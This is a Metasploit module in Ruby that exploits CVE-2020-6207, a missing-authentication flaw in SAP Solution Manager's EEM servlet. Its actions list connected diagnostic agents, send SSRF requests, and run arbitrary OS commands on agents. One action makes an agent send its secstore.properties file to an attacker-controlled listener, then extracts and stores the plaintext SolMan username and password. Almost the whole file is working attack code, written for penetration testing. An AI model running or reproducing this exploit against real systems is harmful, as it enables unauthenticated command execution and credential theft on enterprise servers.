##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::SapSolManEemMissAuth
  include Msf::Exploit::Local::SapSmdAgentUnencryptedProperty

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SAP Solution Manager remote unauthorized OS commands execution',
        'License' => MSF_LICENSE,
        'Author' => [
          'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
          'Pablo Artuso', # @lmkalg The researcher who originally found this vulnerability
          'Dmitry Chastuhin', # @chipik The researcher who made first PoC
          'Vladimir Ivanov' # @_generic_human_ This Metasploit module
        ],
        'Description' => %q{
          This module exploits the CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem) of
          SAP Solution Manager (SolMan) running version 7.2. The vulnerability occurs due to missing authentication
          checks when submitting SOAP requests to the /EemAdminService/EemAdmin page to get information about connected SMDAgents,
          send HTTP request (SSRF), and execute OS commands on connected SMDAgent. Works stable in connected SMDAgent with Java version 1.8.

          Successful exploitation of the vulnerability enables unauthenticated remote attackers to achieve SSRF and execute OS commands from the agent connected
          to SolMan as a user from which the SMDAgent service starts, usually the daaadm.
        },
        'References' => [
          ['CVE', '2020-6207'],
          ['URL', 'https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf'],
          ['URL', 'https://github.com/chipik/SAP_EEM_CVE-2020-6207']
        ],
        'Actions' => [
          ['LIST', { 'Description' => 'List connected agents' }],
          ['SSRF', { 'Description' => 'Send SSRF from connected agent' }],
          ['EXEC', { 'Description' => 'Exec OS command on connected agent' }],
          ['SECSTORE', { 'Description' => 'Get file with SolMan credentials from connected agent' }]
        ],
        'DefaultAction' => 'LIST',
        'DisclosureDate' => '2020-10-03'
      )
    )
    register_options(
      [
        Opt::RPORT(50000),
        OptString.new('TARGETURI', [true, 'Path to the SAP Solution Manager EemAdmin page from the web root', '/EemAdminService/EemAdmin']),
        OptString.new('SSRF_METHOD', [true, 'HTTP method for SSRF', 'GET'], conditions: %w[ACTION == SSRF]),
        OptString.new('SSRF_URI', [true, 'URI for SSRF', 'http://127.0.0.1:80/'], conditions: %w[ACTION == SSRF]),
        OptString.new('COMMAND', [true, 'Command for execute in agent', 'id'], conditions: %w[ACTION == EXEC]),
        OptAddress.new('SRVHOST', [ true, 'The local IP address to listen HTTP requests from agents', '192.168.1.1' ], conditions: %w[ACTION == SECSTORE]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen HTTP requests from agents', 8000 ], conditions: %w[ACTION == SECSTORE]),
        OptString.new('AGENT', [true, 'Agent server name for exec command or SSRF', 'agent_server_name'], conditions: ['ACTION', 'in', %w[SSRF EXEC SECSTORE]]),
      ]
    )
  end

  def setup_xml_and_variables
    @host = datastore['RHOSTS']
    @port = datastore['RPORT']
    @srv_host = datastore['SRVHOST']
    @srv_port = datastore['SRVPORT']
    @path = datastore['TARGETURI']

    @agent_name = datastore['AGENT']
    @script_name = Rex::Text.rand_text_alphanumeric(12)

    if datastore['SSL']
      @schema = 'https://'
    else
      @schema = 'http://'
    end

    @solman_uri = "#{@schema}#{@host}:#{@port}#{@path}"

    @ssrf_method = datastore['SSRF_METHOD']
    @ssrf_uri = datastore['SSRF_URI']
    @ssrf_payload = make_ssrf_payload(@ssrf_method, @ssrf_uri)
    @rce_command = datastore['COMMAND']

    @username = nil
    @password = nil
  end

  # Report Service and Vulnerability
  def report_service_and_vuln
    report_service(
      host: @host,
      port: @port,
      name: 'soap',
      proto: 'tcp',
      info: 'SAP Solution Manager'
    )
    report_vuln(
      host: @host,
      port: @port,
      name: name,
      refs: references
    )
  end

  # Handle incoming HTTP requests from connected agents
  def on_request_uri(cli, request)
    response = create_response(200, 'OK')
    response.body = 'Received'
    cli.send_response(response)

    agent_host = cli.peerhost
    request_uri = request.raw_uri
    secstore_content = request.body
    secstore_filename = request.headers['X-File-Name']

    if secstore_content.nil? || secstore_filename.nil? || agent_host.nil? || request_uri.nil? || request_uri != "/#{@script_name}"
      fail_with(Failure::PayloadFailed, "Failed to retrieve secstore.properties file from agent #{@agent_name}.")
    end
    print_status("Received HTTP request from agent #{@agent_name} - #{agent_host}")

    # Loot secstore.properties file
    loot = store_loot('smdagent.secstore.properties', 'text/plain', agent_host, secstore_content, secstore_filename, 'SMD Agent secstore.properties file')
    print_good("Successfully retrieved file #{secstore_filename} from agent: #{@agent_name} saved in: #{loot}")
    vprint_good("File content:\n#{secstore_content}")

    # Analyze secstore.properties file
    properties = parse_properties(secstore_content)
    properties.each do |property|
      case property[:name]
      when 'smd/agent/User'
        @username = property[:value]
      when 'smd/agent/Password'
        @password = property[:value]
      end
    end

    # Store decoded credentials and report vulnerability
    if @username.nil? || @password.nil?
      fail_with(Failure::NotVulnerable, "The agent: #{@agent_name} sent a secstore.properties file, but this file is likely encrypted or does not contain credentials. The agent: #{@agent_name} is likely patched.")
    else
      # Store decoded credentials
      print_good("Successfully encoded credentials for SolMan server: #{@host}:#{@port} from agent: #{@agent_name} - #{agent_host}")
      print_good("SMD username: #{@username}")
      print_good("SMD password: #{@password}")
      store_valid_credential(
        user: @username,
        private: @password,
        private_type: :password,
        service_data: {
          origin_type: :service,
          address: @host,
          port: @port,
          service_name: 'http',
          protocol: 'tcp'
        }
      )
      # Report vulnerability
      new_references_array = [
        %w[CVE 2019-0307],
        %w[URL https://conference.hitb.org/hitblockdown002/materials/D2T1%20-%20SAP%20RCE%20-%20The%20Agent%20Who%20Spoke%20Too%20Much%20-%20Yvan%20Genuer.pdf]
      ]
      new_references = Rex::Transformer.transform(new_references_array, Array, [SiteReference, Reference], 'Ref')
      report_vuln(
        host: agent_host,
        name: 'Diagnostics Agent in Solution Manager, stores unencrypted credentials for Solution Manager server',
        refs: new_references
      )
    end
  end

  def run
    setup_xml_and_variables
    case action.name
    when 'LIST'
      action_list
    when 'SSRF'
      action_ssrf
    when 'EXEC'
      action_exec
    when 'SECSTORE'
      action_secstore
    else
      print_error("The action #{action.name} is not a supported action.")
    end
  end

  def action_list
    print_status("Getting a list of agents connected to the Solution Manager: #{@host}")
    agents = make_agents_array

    report_service_and_vuln
    if agents.empty?
      print_good("Solution Manager server: #{@host}:#{@port} is vulnerable but no agents are connected!")
    else
      print_good("Successfully retrieved agent list:\n#{pretty_agents_table(agents)}")
    end
  end

  def action_ssrf
    check_agent(@agent_name)

    print_status("Enable EEM on agent: #{@agent_name}")
    enable_eem(@agent_name)

    print_status("Start script: #{@script_name} with SSRF payload on agent: #{@agent_name}")
    send_soap_request(make_soap_body(@agent_name, @script_name, @ssrf_payload))

    print_status("Stop script: #{@script_name} on agent: #{@agent_name}")
    stop_script_in_agent(@agent_name, @script_name)

    print_status("Delete script: #{@script_name} on agent: #{@agent_name}")
    delete_script_in_agent(@agent_name, @script_name)

    report_service_and_vuln
    print_good("Send SSRF: '#{@ssrf_method} #{@ssrf_uri} HTTP/1.1' from agent: #{@agent_name}")
  end

  def action_exec
    check_agent(@agent_name)

    print_status("Enable EEM on agent: #{@agent_name}")
    enable_eem(@agent_name)

    print_status("Start script: #{@script_name} with RCE payload on agent: #{@agent_name}")
    send_soap_request(make_soap_body(@agent_name, @script_name, make_rce_payload(@rce_command)))

    print_status("Stop script: #{@script_name} on agent: #{@agent_name}")
    stop_script_in_agent(@agent_name, @script_name)

    print_status("Delete script: #{@script_name} on agent: #{@agent_name}")
    delete_script_in_agent(@agent_name, @script_name)

    report_service_and_vuln
    print_good("Execution command: '#{@rce_command}' on agent: #{@agent_name}")
  end

  def action_secstore
    agent = check_agent(@agent_name)

    print_status("Enable EEM on agent: #{@agent_name}")
    enable_eem(@agent_name)

    start_service(
      {
        'Uri' => {
          'Proc' => proc { |cli, req| on_request_uri(cli, req) },
          'Path' => "/#{@script_name}"
        }
      }
    )
    @creds_payload = make_steal_credentials_payload(agent[:instanceName], @srv_host, @srv_port, "/#{@script_name}")
    print_status("Start script: #{@script_name} with payload for retrieving SolMan credentials file from agent: #{@agent_name}")
    send_soap_request(make_soap_body(@agent_name, @script_name, @creds_payload))

    sleep(5)
    print_status("Stop script: #{@script_name} on agent: #{@agent_name}")
    stop_script_in_agent(@agent_name, @script_name)

    print_status("Delete script: #{@script_name} on agent: #{@agent_name}")
    delete_script_in_agent(@agent_name, @script_name)

    report_service_and_vuln
    if @username.nil? && @password.nil?
      print_error("Failed to retrieve or decode SolMan credentials file from agent: #{@agent_name}")
    end
  end

end
